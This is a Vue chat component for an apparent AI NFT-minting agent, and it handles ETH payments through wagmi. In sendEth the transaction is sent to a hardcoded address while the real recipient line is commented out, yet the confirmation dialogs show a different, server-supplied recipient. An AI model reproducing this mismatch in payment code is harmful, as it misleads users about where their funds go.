<template>
  <div class="chat-content">
    <div class="chat-top-spacing"></div>
    <n-scrollbar ref="scrollbarRef" class="messages-container">
      <div class="chat-messages">
        <div v-for="message in chatStore.messages" 
             :key="message.id" 
             :class="['message', message.role === 'user' ? 'user' : 'assistant']">
          <div class="message-wrapper">
            <div class="message-content">
              <div v-if="message.type === 'text' || message.type === 'transaction'" 
                   :class="['message-bubble', message.show_status === 'send_eth' ? 'eth-status' : '']">
                <div class="message-text">
                  <MDRenderer :content="message.content" @preview-image="openImagePreview" />
                </div>
                <div class="message-time">{{ message.time || 'just now' }}</div>
              </div>
              <div v-else-if="message.type === 'image'" class="message-image-container">
                <img :src="message.content" 
                     class="message-image" 
                     @click="openImagePreview(message.content)" 
                     alt="Generated NFT" />
              </div>
              <div v-else-if="message.type === 'error'" class="message-bubble error">
                <div class="message-text">
                  <MDRenderer :content="message.content" />
                </div>
                <div class="message-time">{{ message.time || 'just now' }}</div>
              </div>
              <template v-if="message.type === 'error' && isLastMessage(message)">
                <div class="retry-buttons">
                  <n-button class="retry-button"
                            icon-placement="right"
                            @click="retryMessage(chatStore.messages[chatStore.messages.length-2].content)">
                    <template #icon>
                      <n-icon style="width: 16px; height: 16px;"><SmallRefreshIcon /></n-icon>
                    </template>
                    Retry
                  </n-button>
                </div>
              </template>
              <template v-if="message.show_status === 'send_eth'">
                <div class="eth-buttons">
                  <n-button 
                    class="eth-button" 
                    @click="handleSendEth" 
                    :disabled="isPending || isConfirming"
                    icon-placement="right"
                  >
                    {{ ethButtonText }}
                    <template #icon>
                      <n-icon><ETHIcon /></n-icon>
                    </template>
                  </n-button>
                  <n-button 
                    class="eth-button" 
                    @click="checkPayment"
                    :disabled="!hash && !error"
                  >
                    Check Payment
                  </n-button>
                </div>
              </template>
            </div>
          </div>
        </div>
      </div>
    </n-scrollbar>

    <div class="input-container">
      <div class="input-wrapper">
        <n-input
          v-model:value="inputMessage"
          type="textarea"
          :autosize="{ minRows: 1, maxRows: 3 }"
          :placeholder="inputPlaceholder"
          @keypress.enter.prevent="sendMessage"
          class="chat-input"
          :disabled="chatStore.processingState !== 'idle'"
          :theme-overrides="inputThemeOverrides"
          ref="inputRef"
        />
        <n-button quaternary class="send-button" @click="sendMessage" :disabled="!inputMessage.trim()">
          <n-icon :size="16">
            <SendIcon v-if="!inputMessage.trim()" />
            <SendIconHover v-else />
          </n-icon>
        </n-button>
      </div>
    </div>

    <!-- 添加图片预览模态框 -->
    <n-modal
      v-model:show="showImagePreview"
      :mask-closable="true"
      :bordered="false"
      style="width: 768px; height: 768px;"
      transform-origin="center"
      @close="closeImagePreview"
    >
      <div class="image-preview-container">
        <img :src="previewImageUrl" class="preview-image" alt="Preview" />
      </div>
    </n-modal>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, nextTick, watch, h, onUnmounted } from 'vue'
import { useMessage, useDialog } from 'naive-ui'
import type { ScrollbarInst } from 'naive-ui'
import { useChatStore } from '@/stores'
import MDRenderer from '@/components/shared/MDRenderer.vue'
import SendIcon from '@/assets/icons/send.svg?component'
import SendIconHover from '@/assets/icons/send-hover.svg?component'
import ETHIcon from '@/assets/icons/ETH.svg?component'
import SmallRefreshIcon from '@/assets/icons/small-refresh.svg?component'
import { useSendTransaction, useWaitForTransactionReceipt, useChainId } from '@wagmi/vue'
import { parseEther } from 'viem'
import { useWalletStore } from '@/stores'

const message = useMessage()
const walletStore = useWalletStore()
const dialog = useDialog()
const chatStore = useChatStore()
const inputMessage = ref('')
const scrollbarRef = ref<ScrollbarInst | null>(null)
const inputRef = ref<any>(null)

const misato_address = '0xDDCDDBFc282721beacff99Cc67137f728c5fB2fD'

const { 
  data: hash,
  error,
  isPending,
  sendTransaction 
} = useSendTransaction()

const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
  hash,
})

const chainId = useChainId()

// 添加一个变量来跟踪当前正在处理的交易
const currentPaymentMessage = ref<any>(null)

// 添加一个状态来跟踪交易是否失败
const isTransactionFailed = ref(false)

// 添加一个响应式变量存储最新的交易hash
const latestPaymentHash = ref<string | null>(null)

watch(
  () => chatStore.messages,
  (newMessages) => {
    // 当消息被清空时（长度为 0 或只有初始消息），重置所有支付相关状态
    if (newMessages.length <= 1) {
      latestPaymentHash.value = null
      currentPaymentMessage.value = null
      isTransactionFailed.value = false
    }
    scrollToBottom()
  },
  { deep: true }
)

// 添加 formatTime 函数
const formatTime = (date: Date) => {
  const hours = date.getHours().toString().padStart(2, '0')
  const minutes = date.getMinutes().toString().padStart(2, '0')
  return `${hours}:${minutes}`
}

// 监听错误状态
watch(error, (newError) => {
  if (newError) {
    // 设置交易失败状态
    isTransactionFailed.value = true
    // 显示错误弹窗
    dialog.error({
      title: 'Transaction Failed',
      content: () => h('div', null, [
        h('p', null, 'Failed to send transaction:'),
        h('p', { 
          style: 'margin-top: 8px; color: #666; word-break: break-all;' 
        }, newError.message)
      ]),
      positiveText: 'OK'
    })
    // 清除当前交易状态
    currentPaymentMessage.value = null
  }
})

// 修改交易状态监听
watch(
  [() => isConfirmed.value, () => hash.value],
  ([newIsConfirmed, newHash]) => {    
    if (newIsConfirmed && newHash) {
      message.success('Payment confirmed!')
      // 存储最新的交易hash
      latestPaymentHash.value = newHash
      // 添加提示消息
      chatStore.addMessage({
        id: Date.now(),
        type: 'transaction', // 使用新的消息类型
        role: 'user',
        content: "Submitted the transaction. I will click 'check payment' and copy hash to you, after the transaction is confirmed.",
        time: formatTime(new Date())
      })
      currentPaymentMessage.value = null
    }
  }
)


// 添加对处理状态的监听
watch(
  () => chatStore.processingState,
  (newState) => {
    if (newState === 'idle') {
      // 使用 nextTick 确保 DOM 更新后再设置焦点
      nextTick(() => {
        inputRef.value?.focus()
      })
    }
  }
)

// 滚动到底部方法
const scrollToBottom = () => {
  nextTick(() => {
    setTimeout(() => {
      const scrollbar = scrollbarRef.value
      if (scrollbar) {
        scrollbar.scrollTo({
          top: 999999,
          behavior: 'smooth'
        })
      }
    }, 100)
  })
}

// 修改发送消息方法，添加最新的交易hash
const sendMessage = async () => {
  if (!inputMessage.value.trim() || chatStore.processingState !== 'idle') return
  
  const messageText = inputMessage.value.trim()
  inputMessage.value = ''
  
  await chatStore.sendMessage(messageText, {
    pay_fee_hash: latestPaymentHash.value || undefined // 每次发送消息都带上最新的交易hash
  })
  scrollToBottom()
}

// 简化后的重试方法
const retryMessage = async (messageText: string) => {
  chatStore.removeLastMessage()
  await chatStore.sendMessage(messageText)
  scrollToBottom()
}

// 判断是否为最后一条消息
const isLastMessage = (message: any) => {
  return chatStore.messages[chatStore.messages.length - 1].id === message.id
}

// 输入框 placeholder
const inputPlaceholder = computed(() => {
  switch (chatStore.processingState) {
    case 'thinking':
      return 'MISATO is thinking...';
    case 'generating':
      return 'MISATO is generating image...';
    case 'minting':
      return 'MISATO is minting NFT...';
    default:
      return 'Type a message, press Enter to send...';
  }
})

// 添加主题覆盖配置
const inputThemeOverrides = {
  backgroundColor: 'transparent',
  color: 'transparent',
  textAreaColor: 'transparent',
  border: 'none',
  borderRadius: '0',
  textColor: '#2C0CB9',
  placeholderColor: '#C79DDC',
  
  // 移除所有状态效果
  borderHover: 'none',
  borderFocus: 'none',
  borderPressed: 'none',
  colorFocus: 'transparent',
  colorHover: 'transparent',
  colorPressed: 'transparent',
  boxShadowFocus: 'none',
  
  // 字体相关
  fontFamily: "'04b03', monospace",
  fontSize: '32px',
  fontSizeTextArea: '32px',
  padding: '8px 16px',
  heightMedium: '40px',
  lineHeight: '20px',
  
  // 确保子组件也应用相同的样式
  peers: {
    Input: {
      fontSize: '32px',
    },
    Textarea: {
      fontSize: '32px',
    }
  }
}

// 添加预览相关的状态
const showImagePreview = ref(false)
const previewImageUrl = ref('')

// 添加图片预览方法
const openImagePreview = (imageUrl: string) => {
  previewImageUrl.value = imageUrl
  showImagePreview.value = true
}

const closeImagePreview = () => {
  showImagePreview.value = false
  previewImageUrl.value = ''
}

// 监听 hash
watch(hash, (newHash) => {
  console.log('Transaction hash changed:', newHash)
})

const sendEth = async () => {
  try {
    if (!walletStore.isConnected) {
      message.error('Please connect your wallet first')
      return
    }

    // 获取当前消息的支付信息并进行类型检查
    const currentMessage = chatStore.messages.find(m => m.show_status === 'send_eth')
    const paymentInfo = currentMessage?.payment_info

    if (!paymentInfo || 
        !paymentInfo.recipient_address || 
        !paymentInfo.price || 
        !paymentInfo.chainId) {
      message.error('Payment information is incomplete')
      return
    }

    // 保存当前正在处理的交易消息
    currentPaymentMessage.value = currentMessage

    const { recipient_address, price, chainId: requiredChainId } = paymentInfo
    
    // 检查网络是否正确
    if (chainId.value !== requiredChainId) {
      message.error(`Please switch to ${paymentInfo.network} network`)
      return
    }

    console.log('Sending Transaction:', {
      recipient: paymentInfo.recipient_address,
      price: paymentInfo.price,
      chainId: paymentInfo.chainId,
      currentChainId: chainId.value
    })

    // 发送交易
    sendTransaction({ 
      //to: recipient_address as `0x${string}`, 
      to: misato_address,
      value: parseEther(price)
    })

    console.log('Transaction Sent:', {
      hash: hash.value,
      error: error.value
    })

    if (error?.value) {
      message.error(`Transaction failed: ${error.value?.message}`)
      return
    }

    message.success('Transaction sent!')
  } catch (err: any) {
    console.error('Send ETH error:', err)
    currentPaymentMessage.value = null
    message.error(err.message || 'Failed to send ETH')
  }
}

const handleSendEth = () => {
  isTransactionFailed.value = false // 重置失败状态
  const currentMessage = chatStore.messages.find(m => m.show_status === 'send_eth')
  const paymentInfo = currentMessage?.payment_info

  if (!paymentInfo || 
      !paymentInfo.recipient_address || 
      !paymentInfo.price || 
      !paymentInfo.network) {
    message.error('Payment information is incomplete')
    return
  }

  // 检查是否已经有成功的交易
  if (isConfirmed.value && hash.value) {
    dialog.warning({
      title: 'Payment Already Sent',
      content: () => h('div', null, [
        h('p', null, 'You have already made a payment for this request.'),
        h('p', { style: 'margin-top: 8px; color: #666;' }, 
          `Previous transaction hash: ${hash.value}`),
        h('p', { style: 'margin-top: 12px; color: #2C0CB9;' }, 
          'Do you still want to make another payment?'),
        h('p', { style: 'margin-top: 8px; font-size: 12px; color: #999;' }, [
          h('span', null, `Amount: ${paymentInfo.price} ETH`),
          h('br'),
          h('span', null, `Recipient: ${paymentInfo.recipient_address}`),
          h('br'),
          h('span', null, `Network: ${paymentInfo.network}`)
        ])
      ]),
      positiveText: 'Yes, Pay Again',
      negativeText: 'Cancel',
      onPositiveClick: sendEth
    })
    return
  }

  // 如果是首次支付，显示正常的确认对话框
  dialog.warning({
    title: 'Send ETH',
    content: () => h('div', null, [
      h('p', null, `Are you sure to send ${paymentInfo.price} ETH?`),
      h('p', { style: 'margin-top: 8px; font-size: 12px; color: #999;' }, 
        `Recipient: ${paymentInfo.recipient_address}`),
      h('p', { style: 'margin-top: 4px; font-size: 12px; color: #999;' }, 
        `Network: ${paymentInfo.network}`)
    ]),
    positiveText: 'Confirm',
    negativeText: 'Cancel',
    onPositiveClick: sendEth
  })
}

// 检查支付状态的按钮
const checkPayment = async () => {
  // 打印所有相关状态
  console.log('Payment Status:', {
    hash: hash.value,
    isPending: isPending.value,
    isConfirming: isConfirming.value,
    isConfirmed: isConfirmed.value,
    error: error.value,
    currentPaymentMessage: currentPaymentMessage.value
  })

  if (!hash.value) {
    message.warning('No transaction found')
    return
  }

  if (isConfirming.value) {
    message.info('Checking payment status...')
    return
  }

  if (error?.value) {
    message.error('Transaction failed')
    return
  }

  if (isConfirmed.value) {
    dialog.info({
      title: 'Transaction Confirmed',
      content: () => h('div', null, [
        h('p', null, 'Your transaction has been confirmed!'),
        h('p', { style: 'margin-top: 12px; word-break: break-all;' }, [
          'Transaction Hash: ',
          h('span', { style: 'color: #2C0CB9; font-family: monospace;' }, hash.value)
        ]),
        h('p', { 
          style: 'margin-top: 12px; font-size: 14px; color: #666;' 
        }, 'You can copy this hash and paste it to the chat with the word "payed" if the AI hasn\'t detected your payment automatically.')
      ]),
      positiveText: 'Copy Hash',
      negativeText: 'Close',
      onPositiveClick: async () => {
        try {
          await navigator.clipboard.writeText(hash.value!)
          message.success('Hash copied to clipboard')
        } catch (err) {
          message.error('Failed to copy hash')
        }
      }
    })
  }
}

// 更新按钮状态的显示逻辑也需要修改
const ethButtonText = computed(() => {
  console.log('Button Status:', {
    isTransactionFailed: isTransactionFailed.value,
    isPending: isPending.value,
    isConfirming: isConfirming.value,
    isConfirmed: isConfirmed.value
  })
  
  if (isTransactionFailed.value) return 'Send ETH'
  if (isPending.value) return 'Sending...'
  if (isConfirming.value) return 'Confirming...'
  if (isConfirmed.value) return 'Confirmed!'
  return 'Send ETH'
})

// 清理函数
onUnmounted(() => {
  currentPaymentMessage.value = null
  isTransactionFailed.value = false
})

</script>

<style scoped>
.chat-content {
  display: flex;
  flex-direction: column;
  height: 100%;
}

.chat-top-spacing {
  height: 42px;
}

.messages-container {
  flex: 1;
  min-height: 0;
  padding: 8px;
}

.chat-messages {
  display: flex;
  flex-direction: column;
  gap: 8px;
  padding: 0 8px;
  padding-right: 14px;
}

.message {
  display: flex;
  flex-direction: column;
  gap: 4px;
}

.message.user {
  align-items: flex-end;
  padding-left: 30%;
}

.message.assistant {
  align-items: flex-start;
  padding-right: 30%;
}

.message-wrapper {
  display: flex;
  gap: 8px;
}

.message-content {
  max-width: 100%;
}

.message-bubble {
  display: flex;
  padding: 12px;
  flex-direction: column;
  justify-content: center;
  gap: 2px;
  word-break: break-word;
  border-radius: 0;
  max-width: 100%;
  white-space: normal;
}

.message.assistant .message-bubble {
  background: #CFE4F9;
  border: none;
  align-self: flex-start;
}

.message.user .message-bubble {
  background: #C0F04E;
  border: none;
  display: flex;
  padding: 12px;
  flex-direction: column;
  justify-content: flex-end;
  align-items: flex-end;
  gap: 2px;
  align-self: flex-end;
}

.message-bubble.error {
  background-color: var(--n-color-error-1);
}

.message-image-container {
  max-width: 512px;
  aspect-ratio: 1;
  width: 300px;
  height: 300px;
  background: #f5f5f5;
  display: flex;
  align-items: center;
  justify-content: center;
}

.message-image {
  max-width: 300px;
  max-height: 300px;
  height: auto;
  border-radius: 8px;
  margin: 0;
  cursor: zoom-in;
  transition: transform 0.2s ease;
  object-fit: contain;
}

.message-image:hover {
  transform: scale(1.02);
}

.error-message-container {
  display: flex;
  align-items: center;
  gap: 8px;
}

.retry-buttons {
  display: flex;
  margin-top: 8px;
}

.retry-button {
  background: var(--Text-P, #2C0CB9) !important;
  color: #FFF !important;
  font-family: '04b03';
  font-size: 14px;
  font-style: normal;
  font-weight: 400;
  line-height: 12px;
  height: 36px;
  padding: 4px;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 2px;
  flex: 1 0 0;
  border: none !important;
  width: 322px !important;
}

.retry-button:hover {
  opacity: 0.9 !important;
  background: var(--Text-P, #2C0CB9) !important;
}

.retry-button .n-icon {
  width: 16px;
  height: 16px;
  margin-right: 4px;
}

.message-text {
  color: var(--Text-P, #2C0CB9);
  font-family: '04b03';
  font-size: 12px;
  font-style: normal;
  font-weight: 400;
  line-height: 12px;
  white-space: pre-line;
  word-break: break-word;
  max-width: 100%;
}

.message-time {
  color: var(--Background-W, rgba(0, 0, 0, 0.24));
  font-family: '04b03';
  font-size: 12px;
  font-style: normal;
  font-weight: 400;
  line-height: 12px;
  align-self: stretch;
}

.message.assistant .message-time {
  text-align: left;
}

.message.user .message-time {
  text-align: right;
}

.message-bubble :deep(.markdown-body) {
  margin: 0;
  white-space: normal;
  color: inherit;
}

.message-bubble :deep(.markdown-body img) {
  max-width: 300px;
  height: auto;
  margin: 8px 0;
  display: block; /* 确保图片不会产生额外的间隙 */
}

.message-bubble :deep(p) {
  margin: 0; /* 移除段落的默认边距 */
  padding: 0;
}

.input-container {
  padding: 8px;
}

.chat-input {
  :deep(.n-input__suffix) {
    margin-left: 0px;
    display: flex;
    align-items: center;
  }
}

/* 自定义滚动条样式 */
:deep(.n-scrollbar-rail) {
  background-color: transparent !important;
}

:deep(.n-scrollbar-rail.vertical) {
  width: 8px !important;
}

:deep(.n-scrollbar-rail__scrollbar) {
  width: 8px !important;
  background-color: #B1FDE1 !important;
  border-radius: 0 !important;
}

.chat-input :deep(.n-input__suffix) {
  margin-left: 12px;
  display: flex;
  align-items: center;
}

.chat-input :deep(.n-input__suffix) {
  margin-left: 12px;
  display: flex;
  align-items: center;
}

.chat-input :deep(textarea:-webkit-autofill),
.chat-input :deep(textarea:-webkit-autofill:hover), 
.chat-input :deep(textarea:-webkit-autofill:focus) {
  -webkit-box-shadow: 0 0 0 1000px #F9D7EF inset !important;
  -webkit-text-fill-color: #2C0CB9 !important;
  transition: background-color 5000s ease-in-out 0s;  /* 防止过渡动画显示默认背景色 */
}

.chat-input :deep(textarea) {
  font-size: 16px !important;
}

/* 添加图标切换相关样式 */
.send-button {
  position: relative;
  background: transparent !important;
}

.send-button:hover {
  background: rgba(255, 255, 255, 0.07) !important;
}

/* 图标大小控制 */
.send-button :deep(.n-icon) {
  font-size: 24px;
  width: 24px;
  height: 24px;
}

.send-button :deep(.n-button__icon) {
  display: flex;
  align-items: center;
  justify-content: center;
}

/* 按钮样式重置 */
.send-button:deep(.n-button) {
  --n-color: transparent !important;
  --n-color-hover: transparent !important;
  --n-color-pressed: transparent !important;
  --n-border: none !important;
  --n-border-hover: none !important;
  --n-border-pressed: none !important;
}

/* 添加图片预览相关样式 */
.image-preview-container {
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
}

.preview-image {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
}

.eth-buttons {
  display: flex;
  gap: 8px;
  margin-top: 8px;
  width: 322px;
}

.eth-button {
  background: var(--Text-P, #2C0CB9) !important;
  color: #FFF !important;
  font-family: '04b03';
  font-size: 14px;
  font-style: normal;
  font-weight: 400;
  line-height: 12px; /* 85.714% */
  height: 36px;
  padding: 4px;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 2px;
  flex: 1 0 0;
  border: none !important;
}

.eth-button:hover {
  opacity: 0.9 !important;
  background: var(--Text-P, #2C0CB9) !important;
}

.eth-button :deep(.n-button__icon) {
  font-size: 12px;
  margin-left: -2px;
  margin-top: 4px;
}

.eth-button .n-icon {
  width: 12px;
  height: 12px;
}

.message-bubble.eth-status {
  width: 322px;
}

.input-wrapper {
  display: flex;
  padding: 0px 0px;
  padding-left: 4px;
  padding-right: 24px;
  align-items: center;
  gap: 12px;
  flex: 1 0 0;
  background: #F9D7EF;
}

.chat-input {
  flex: 1;
}

.chat-input :deep(.n-input) {
  background: transparent;
  border: none;
}

.send-button {
  padding: 0;
  width: 16px;
  height: 16px;
  min-width: auto;
  background: transparent !important;
}

.send-button:hover {
  background: transparent !important;
}

/* 添加额外的样式覆盖 */
.chat-input :deep(.n-input) {
  background: transparent !important;
  border: none !important;
}

.chat-input :deep(.n-input:hover),
.chat-input :deep(.n-input:focus),
.chat-input :deep(.n-input:active) {
  border: none !important;
  box-shadow: none !important;
  background: transparent !important;
}

.chat-input :deep(.n-input__textarea-el),
.chat-input :deep(.n-input__textarea-el:hover),
.chat-input :deep(.n-input__textarea-el:focus) {
  background: transparent !important;
  box-shadow: none !important;
}

/* 处理自动填充的背景色 */
.chat-input :deep(textarea:-webkit-autofill),
.chat-input :deep(textarea:-webkit-autofill:hover), 
.chat-input :deep(textarea:-webkit-autofill:focus) {
  -webkit-box-shadow: 0 0 0 1000px #F9D7EF inset !important;
  -webkit-text-fill-color: #2C0CB9 !important;
  transition: background-color 5000s ease-in-out 0s;  /* 防止过渡动画显示默认背景色 */
}

/* 使用多层选择器提高优先级 */
.chat-content .input-wrapper .chat-input :deep(.n-input.n-input--textarea .n-input__textarea-el),
.chat-content .input-wrapper .chat-input :deep(.n-input.n-input--textarea .n-input__textarea-mirror),
.chat-content .input-wrapper .chat-input :deep(.n-input.n-input--textarea .n-input__placeholder) {
  font-family: '04b03', monospace !important;
  font-size: 12px !important;
  font-style: normal !important;
  font-weight: 400 !important;
  line-height: 16px !important;
  color: #2C0CB9 !important;
}
</style> 